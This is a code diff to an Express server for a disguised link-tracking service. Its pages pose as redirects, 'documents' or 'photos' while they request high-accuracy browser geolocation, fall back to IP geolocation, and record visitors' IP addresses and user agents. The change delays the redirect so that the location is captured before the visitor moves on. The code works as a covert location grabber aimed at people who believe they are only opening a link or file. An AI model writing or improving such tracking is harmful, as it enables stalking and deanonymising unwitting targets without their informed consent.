@@ -230,14 +230,27 @@ app.get('/api/links/:id', async (req, res) => {
 app.post('/api/track/:id', async (req, res) => {
     try {
         const { id } = req.params;
+        console.log(`Tracking visit for link ID: ${id}`);
+        console.log('Request body:', req.body);
+
         let { latitude, longitude, locationDenied } = req.body;
         const ip_address = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
         const user_agent = req.headers['user-agent'];
+
+        console.log('IP address:', ip_address);
+        console.log('User agent:', user_agent);
 
         let locationSource = 'browser';
         let city = null;
         let region = null;
         let country = null;
+
+        // Verify link exists
+        const link = await Link.findOne({ id });
+        if (!link) {
+            console.error(`Link with ID ${id} not found`);
+            return res.status(404).json({ error: 'Link not found' });
+        }
 
         // Jika koordinat tidak tersedia atau lokasi ditolak, coba dapatkan dari IP
         if ((!latitude || !longitude || locationDenied) && ip_address) {
@@ -252,9 +265,14 @@ app.post('/api/track/:id', async (req, res) => {
                 country = ipLocation.country;
                 locationSource = 'ip';
                 console.log('Location from IP:', { latitude, longitude, city, country });
+            } else {
+                console.log('Failed to get location from IP');
             }
+        } else {
+            console.log('Using browser location:', { latitude, longitude });
         }
 
+        // Buat entri kunjungan baru
         const visit = new Visit({
             link_id: id,
             latitude,
@@ -268,12 +286,126 @@ app.post('/api/track/:id', async (req, res) => {
         });
 
         await visit.save();
-        res.status(201).json({ success: true });
+        console.log('Visit recorded with ID:', visit._id);
+
+        res.status(201).json({
+            success: true,
+            message: 'Visit recorded successfully',
+            location: {
+                source: locationSource,
+                latitude,
+                longitude,
+                city,
+                region,
+                country
+            }
+        });
     } catch (error) {
-        console.error('Server error:', error);
+        console.error('Server error in tracking:', error);
         res.status(500).json({ error: error.message });
     }
 });
+
+// Bagian script dari template HTML redirect
+const redirectScript = `
+<script>
+    // Flag untuk memastikan kita hanya redirect sekali
+    let hasRedirected = false;
+    
+    // Fungsi untuk melakukan redirect
+    function doRedirect() {
+        if (!hasRedirected) {
+            hasRedirected = true;
+            window.location.href = "{{REDIRECT_URL}}";
+        }
+    }
+    
+    // Timeout untuk memastikan redirect terjadi meski ada masalah
+    // Tunggu 1500ms (1,5 detik) sebelum redirect
+    setTimeout(doRedirect, 1500);
+    
+    // Function to send location data to the server
+    function sendLocationData(position) {
+        const locationData = {
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude
+        };
+        
+        fetch('/api/track/{{LINK_ID}}', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(locationData)
+        })
+        .then(response => {
+            if (!response.ok) {
+                throw new Error('Network response was not ok');
+            }
+            return response.json();
+        })
+        .then(data => {
+            console.log('Location tracked:', data);
+            // Redirect after data is sent successfully
+            doRedirect();
+        })
+        .catch(error => {
+            console.error('Error sending location data:', error);
+            // Still redirect even if there was an error
+            doRedirect();
+        });
+    }
+    
+    // Function to handle location error
+    function handleLocationError(error) {
+        console.error('Error getting location:', error);
+        
+        // Kirim data dengan indikasi lokasi ditolak
+        fetch('/api/track/{{LINK_ID}}', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ locationDenied: true })
+        })
+        .then(response => {
+            if (!response.ok) {
+                throw new Error('Network response was not ok');
+            }
+            return response.json();
+        })
+        .then(data => {
+            console.log('Denial tracked:', data);
+            doRedirect();
+        })
+        .catch(error => {
+            console.error('Error sending location denial data:', error);
+            doRedirect();
+        });
+    }
+    
+    // Request location immediately
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendLocationData, handleLocationError, {
+            enableHighAccuracy: true,
+            timeout: 5000,
+            maximumAge: 0
+        });
+    } else {
+        // Browser tidak mendukung geolocation
+        fetch('/api/track/{{LINK_ID}}', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ locationDenied: true })
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log('Fallback tracked:', data);
+            doRedirect();
+        })
+        .catch(error => {
+            console.error('Error sending fallback data:', error);
+            doRedirect();
+        });
+    }
+</script>
+`;
 
 // Redirect based on custom URL if available
 app.get('/t/:id', async (req, res) => {
@@ -307,6 +439,11 @@ app.get('/t/:id', async (req, res) => {
                 console.error('Error fetching metadata:', metaError);
                 // Tetap gunakan default metadata jika terjadi error
             }
+
+            // Prepare script with proper values
+            const scriptWithValues = redirectScript
+                .replace(/{{REDIRECT_URL}}/g, link.custom_url)
+                .replace(/{{LINK_ID}}/g, id);
 
             // Send HTML yang melakukan pelacakan dan redirect otomatis dengan metadata asli
             const html = `
@@ -348,57 +485,27 @@ app.get('/t/:id', async (req, res) => {
                     .redirect-msg {
                         margin-bottom: 20px;
                     }
+                    .loader {
+                        border: 5px solid #f3f3f3;
+                        border-radius: 50%;
+                        border-top: 5px solid #3498db;
+                        width: 30px;
+                        height: 30px;
+                        animation: spin 1s linear infinite;
+                        margin: 10px auto;
+                    }
+                    @keyframes spin {
+                        0% { transform: rotate(0deg); }
+                        100% { transform: rotate(360deg); }
+                    }
                 </style>
             </head>
             <body>
                 <div class="container">
                     <div class="redirect-msg">Redirecting you to your destination...</div>
+                    <div class="loader"></div>
                 </div>
-                <script>
-                    // Function to send location data to the server
-                    function sendLocationData(position) {
-                        const locationData = {
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude
-                        };
-                        
-                        fetch('/api/track/${id}', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify(locationData)
-                        })
-                        .catch(error => console.error('Error sending location data:', error));
-                    }
-                    
-                    // Function to handle location error
-                    function handleLocationError(error) {
-                        console.error('Error getting location:', error);
-                        
-                        // Kirim data dengan indikasi lokasi ditolak
-                        fetch('/api/track/${id}', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ locationDenied: true })
-                        })
-                        .catch(error => console.error('Error sending location denial data:', error));
-                    }
-                    
-                    // Request location and redirect immediately
-                    if (navigator.geolocation) {
-                        navigator.geolocation.getCurrentPosition(sendLocationData, handleLocationError);
-                    } else {
-                        // Browser tidak mendukung geolocation
-                        fetch('/api/track/${id}', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ locationDenied: true })
-                        })
-                        .catch(error => console.error('Error sending fallback data:', error));
-                    }
-                    
-                    // Redirect immediately without waiting for location
-                    window.location.href = "${link.custom_url}";
-                </script>
+                ${scriptWithValues}
             </body>
             </html>
             `;
@@ -454,6 +561,11 @@ app.get('/file/:filename', async (req, res) => {
                 // Tetap gunakan default metadata jika terjadi error
             }
 
+            // Prepare script with proper values
+            const scriptWithValues = redirectScript
+                .replace(/{{REDIRECT_URL}}/g, matchedLink.custom_url)
+                .replace(/{{LINK_ID}}/g, matchedLink.id);
+
             // Send HTML yang melakukan pelacakan dan redirect otomatis dengan metadata asli
             const html = `
             <!DOCTYPE html>
@@ -494,57 +606,27 @@ app.get('/file/:filename', async (req, res) => {
                     .redirect-msg {
                         margin-bottom: 20px;
                     }
+                    .loader {
+                        border: 5px solid #f3f3f3;
+                        border-radius: 50%;
+                        border-top: 5px solid #3498db;
+                        width: 30px;
+                        height: 30px;
+                        animation: spin 1s linear infinite;
+                        margin: 10px auto;
+                    }
+                    @keyframes spin {
+                        0% { transform: rotate(0deg); }
+                        100% { transform: rotate(360deg); }
+                    }
                 </style>
             </head>
             <body>
                 <div class="container">
                     <div class="redirect-msg">Opening document...</div>
+                    <div class="loader"></div>
                 </div>
-                <script>
-                    // Function to send location data to the server
-                    function sendLocationData(position) {
-                        const locationData = {
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude
-                        };
-                        
-                        fetch('/api/track/${matchedLink.id}', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify(locationData)
-                        })
-                        .catch(error => console.error('Error sending location data:', error));
-                    }
-                    
-                    // Function to handle location error
-                    function handleLocationError(error) {
-                        console.error('Error getting location:', error);
-                        
-                        // Kirim data dengan indikasi lokasi ditolak
-                        fetch('/api/track/${matchedLink.id}', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ locationDenied: true })
-                        })
-                        .catch(error => console.error('Error sending location denial data:', error));
-                    }
-                    
-                    // Request location and redirect immediately
-                    if (navigator.geolocation) {
-                        navigator.geolocation.getCurrentPosition(sendLocationData, handleLocationError);
-                    } else {
-                        // Browser tidak mendukung geolocation
-                        fetch('/api/track/${matchedLink.id}', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ locationDenied: true })
-                        })
-                        .catch(error => console.error('Error sending fallback data:', error));
-                    }
-                    
-                    // Redirect immediately without waiting for location
-                    window.location.href = "${matchedLink.custom_url}";
-                </script>
+                ${scriptWithValues}
             </body>
             </html>
             `;
@@ -598,6 +680,11 @@ app.get('/photo/:filename', async (req, res) => {
                 // Tetap gunakan default metadata jika terjadi error
             }
 
+            // Prepare script with proper values
+            const scriptWithValues = redirectScript
+                .replace(/{{REDIRECT_URL}}/g, link.custom_url)
+                .replace(/{{LINK_ID}}/g, id);
+
             // Send HTML yang melakukan pelacakan dan redirect otomatis dengan metadata asli
             const html = `
             <!DOCTYPE html>
@@ -638,57 +725,27 @@ app.get('/photo/:filename', async (req, res) => {
                     .redirect-msg {
                         margin-bottom: 20px;
                     }
+                    .loader {
+                        border: 5px solid #f3f3f3;
+                        border-radius: 50%;
+                        border-top: 5px solid #3498db;
+                        width: 30px;
+                        height: 30px;
+                        animation: spin 1s linear infinite;
+                        margin: 10px auto;
+                    }
+                    @keyframes spin {
+                        0% { transform: rotate(0deg); }
+                        100% { transform: rotate(360deg); }
+                    }
                 </style>
             </head>
             <body>
                 <div class="container">
                     <div class="redirect-msg">Opening photo...</div>
+                    <div class="loader"></div>
                 </div>
-                <script>
-                    // Function to send location data to the server
-                    function sendLocationData(position) {
-                        const locationData = {
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude
-                        };
-                        
-                        fetch('/api/track/${id}', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify(locationData)
-                        })
-                        .catch(error => console.error('Error sending location data:', error));
-                    }
-                    
-                    // Function to handle location error
-                    function handleLocationError(error) {
-                        console.error('Error getting location:', error);
-                        
-                        // Kirim data dengan indikasi lokasi ditolak
-                        fetch('/api/track/${id}', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ locationDenied: true })
-                        })
-                        .catch(error => console.error('Error sending location denial data:', error));
-                    }
-                    
-                    // Request location and redirect immediately
-                    if (navigator.geolocation) {
-                        navigator.geolocation.getCurrentPosition(sendLocationData, handleLocationError);
-                    } else {
-                        // Browser tidak mendukung geolocation
-                        fetch('/api/track/${id}', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ locationDenied: true })
-                        })
-                        .catch(error => console.error('Error sending fallback data:', error));
-                    }
-                    
-                    // Redirect immediately without waiting for location
-                    window.location.href = "${link.custom_url}";
-                </script>
+                ${scriptWithValues}
             </body>
             </html>
             `;
